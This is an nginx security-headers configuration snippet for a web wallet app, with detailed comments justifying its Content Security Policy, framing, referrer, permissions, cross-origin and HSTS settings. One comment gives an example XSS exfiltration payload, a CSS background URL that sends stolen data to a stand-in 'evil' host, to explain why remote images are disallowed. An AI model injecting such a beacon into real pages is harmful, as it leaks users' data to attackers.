# ============================================================
#  Security response headers for the DOCUMENTS NGINX SERVES
#  Installed by setup-server.sh to:
#    /etc/nginx/snippets/datahood-security-headers.conf
# ------------------------------------------------------------
#  WHY THIS IS A SEPARATE FILE AND NOT A BLOCK IN nginx.conf
#
#  nginx's add_header does NOT merge across levels: if a `location`
#  block contains even one add_header of its own, EVERY add_header
#  inherited from the enclosing `server` block is discarded for that
#  location. nginx.conf has two locations with their own add_header
#  (the immutable cache on /assets/ and the no-store on index.html) —
#  and index.html is precisely the document that needs a CSP. Declaring
#  these headers once in `server` would therefore protect every URL
#  EXCEPT the HTML shell, silently, while `curl -I https://domain/`
#  followed a path that made it look like it worked.
#
#  So the headers live here and are `include`d at each level that needs
#  them. One copy, no inheritance to reason about.
#
#  WHY IT IS NOT INCLUDED IN `location /api/`
#
#  Express already sets its own headers there via helmet() — including
#  its own Content-Security-Policy. Two CSP headers on one response are
#  not "the stricter one wins"; the browser enforces BOTH, so the
#  effective policy is their intersection and no single file explains
#  the result. nginx owns the headers for what nginx serves; helmet owns
#  the headers for what Express serves. Keep that line clean.
#
#  VERIFY AFTER DEPLOY — this file is worth exactly nothing unproven:
#    curl -sI https://__DOMAIN__/ | grep -i -E 'content-security|x-frame|nosniff'
#    curl -sI https://__DOMAIN__/index.html | grep -ci content-security   # expect 1
#    curl -sI https://__DOMAIN__/assets/<hashed>.js | grep -ci nosniff    # expect 1
#  Then open the site and read the browser console. A CSP that blocks
#  something real reports it there and nowhere else.
# ============================================================

# ---------- Content Security Policy ----------
#
#  This policy is derived from what frontend/build/index.html ACTUALLY
#  references, not from a template. That build contains: one same-origin
#  module script, one same-origin stylesheet, one JSON-LD data block, and
#  no third-party origin of any kind. Wallet funding is by dedicated
#  virtual bank account plus a server-to-server webhook, so there is no
#  gateway checkout SDK to allowlist — which is the single reason a
#  script-src this tight is possible here at all. If a hosted checkout
#  script is ever added, this is the line that will block it, and the fix
#  is to name that exact origin, never to add 'unsafe-inline'.
#
#  Each relaxation below is deliberate:
#
#  style-src 'unsafe-inline' — REQUIRED, not laziness. The app uses React
#    style={{...}} props in many places, which become element style
#    attributes, and CSP2 governs those under style-src. Removing this
#    breaks layout across the admin screens. The residual risk is
#    CSS-based tricks, not code execution; script-src stays clean.
#
#  img-src data: blob: — data: for inline SVG/canvas output (the receipt
#    renderer and the 2FA QR code), blob: for generated images. Note what
#    is NOT here: https:. A wildcard image source is an exfiltration
#    channel — under XSS, `background:url(https://evil/?=<stolen>)` is a
#    GET the browser will happily make. Consequence to know about: a
#    REMOTE image pasted into a newsletter body will not render in the
#    admin preview iframe (it inherits this policy). The email itself is
#    unaffected — it renders in the recipient's mail client. If you decide
#    that preview fidelity is worth more than the beacon channel, add
#    https: here and nowhere else.
#
#  frame-src 'self' — the newsletter preview is a srcdoc iframe with
#    sandbox="". A srcdoc document inherits this policy rather than being
#    matched against frame-src, which is why the preview keeps working.
#
#  base-uri 'none' — blocks an injected <base href>, which would silently
#    repoint every relative URL in the document, script tags included.
#
#  frame-ancestors 'none' — this app must never be embedded. Clickjacking
#    a wallet is a transfer someone did not mean to authorise.
#
#  Report-Only rollout, if you would rather watch before enforcing:
#  duplicate the line below as Content-Security-Policy-Report-Only,
#  comment out the enforcing one, browse every screen, then swap back.
#  Do not leave BOTH enforcing.
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; worker-src 'self'; manifest-src 'self'; media-src 'self'; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests" always;

# ---------- Framing / sniffing ----------
# X-Frame-Options duplicates frame-ancestors above on purpose: it is the
# only one older browsers understand, and a clickjacked wallet is worth
# two locks.
add_header X-Frame-Options "DENY" always;

# Without this, a browser may decide a JSON or text response is HTML and
# render it. Any endpoint that reflects user input then becomes stored
# XSS on our own origin.
add_header X-Content-Type-Options "nosniff" always;

# ---------- Referrer ----------
# Same-origin navigations keep the full path; cross-origin gets the
# origin only, and an https->http downgrade sends nothing. This matters
# because SPA paths are not all boring: a support link clicked from
# /admin/users/82 should not tell the destination which customer an
# admin was looking at.
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# ---------- Device APIs ----------
# Nothing in this app needs a camera, a microphone or a location. Denying
# them means an injected script cannot ask either, and the user never
# sees a permission prompt that would look like it came from us.
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), usb=(), magnetometer=(), payment=()" always;

# ---------- Cross-origin isolation ----------
# COOP severs the window.opener link, so a page we link out to cannot
# reach back into this one. COANP-adjacent CORP stops other sites
# loading our images and documents as subresources.
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Resource-Policy "same-origin" always;
add_header X-Permitted-Cross-Domain-Policies "none" always;

# ---------- HSTS ----------
#  INERT UNTIL TLS EXISTS. Browsers ignore Strict-Transport-Security on a
#  plain-http response, so shipping it before certbot runs is harmless
#  rather than a trap — it simply starts working the moment the site is
#  https.
#
#  DELIBERATELY WITHOUT includeSubDomains AND WITHOUT preload, and this
#  is the one header here that is hard to undo. includeSubDomains forces
#  https on EVERY subdomain for a year, including any that does not have
#  a certificate yet — the legacy PHP install, a webmail host, a staging
#  box. Browsers cache the directive, so a mistake cannot be fixed by
#  removing the header; you would have to reach every visitor. Add it
#  only once you have confirmed every subdomain you serve over HTTP
#  either has TLS or is gone, and add `preload` only if you intend that
#  to be permanent.
add_header Strict-Transport-Security "max-age=31536000" always;
